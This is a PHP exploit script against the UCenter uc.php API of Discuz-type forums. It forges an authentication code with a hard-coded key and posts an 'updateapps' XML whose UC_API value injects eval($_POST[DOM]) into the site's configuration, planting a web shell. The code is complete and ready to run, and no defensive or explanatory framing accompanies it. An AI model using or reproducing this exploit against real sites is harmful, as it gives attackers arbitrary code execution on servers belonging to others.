<?php
// ´úÂë°æÈ¨¹éÔ­×÷ÕßËùÓÐ£¡
    $timestamp = time()+10*3600;
    $host="127.0.0.1";
    $uc_key="eapf15K8b334Bc8eBeY4Gfn1VbqeA0N5Waofq6J285Ca33i151e551g0l9f2l3dd";
    $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $uc_key));
    $cmd1='<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
 <item id="UC_API">http://xxx\');eval($_POST[DOM]);//</item>
</root>';
    $cmd2='<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
 <item id="UC_API">http://aaa</item>
</root>';
    $html1 = send($cmd1);
    echo $html1;
    $html2 = send($cmd2);
    echo $html2;
 
function send($cmd){
    global $host,$code;
    $message = "POST /api/uc.php?code=".$code."  HTTP/1.1\r\n";
    $message .= "Accept: */*\r\n";
    $message .= "Referer: ".$host."\r\n";
    $message .= "Accept-Language: zh-cn\r\n";
    $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
    $message .= "Host: ".$host."\r\n";
    $message .= "Content-Length: ".strlen($cmd)."\r\n";
    $message .= "Connection: Close\r\n\r\n";
    $message .= $cmd;
 
	//var_dump($message);
    $fp = fsockopen($host, 80);
    fputs($fp, $message);
 
    $resp = '';
 
    while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);
 
    return $resp;
}
 
function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
 
    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
 
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
 
    $result = '';
    $box = range(0, 255);
 
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
 
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
 
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
 
    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
                return '';
            }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
 
}
?>